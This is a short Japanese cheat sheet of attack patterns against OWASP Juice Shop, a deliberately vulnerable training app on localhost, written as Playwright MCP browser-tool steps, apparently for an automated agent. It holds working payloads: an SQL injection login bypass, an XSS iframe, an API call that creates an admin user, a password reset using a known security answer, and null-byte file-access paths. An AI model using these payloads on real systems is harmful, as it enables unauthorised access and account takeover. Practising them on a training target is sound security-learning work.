# Playwright Attack Patterns

Juice Shop を Playwright MCP で攻撃するパターン集。

## SQLi ログイン

```
1. browser_navigate → http://localhost:3000/#/login
2. browser_snapshot → ref確認
3. browser_type → email: "' OR 1=1--"
4. browser_type → password: "a"
5. browser_click → Loginボタン
```

## XSS 攻撃

```
browser_navigate → http://localhost:3000/#/search?q=<iframe src="javascript:alert('xss')">
```

## API 操作 (fetch)

```javascript
browser_evaluate → function:
() => fetch('/api/Users', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'test@test.com', password: 'test', role: 'admin'})
}).then(r => r.json())
```

## 隠しページアクセス

```
/#/score-board        /#/administration
/#/web3-sandbox       /#/tokensale-ico-ea
/ftp                  /metrics
/support/logs
```

## パスワードリセット

```
1. browser_navigate → /#/forgot-password
2. browser_type → email: "bjoern@owasp.org"
3. browser_type → answer: "Zaya"
4. browser_type → password: 新パスワード
5. browser_click → Reset
```

## Poison Null Byte

```
/ftp/package.json.bak%2500.md
/ftp/eastere.gg%2500.md
/ftp/coupons_2013.md.bak%2500.md
```

## トラブルシューティング

**「既存のブラウザ セッションで開いています」:**
```bash
rm -rf ~/Library/Caches/ms-playwright/mcp-chrome-*
```
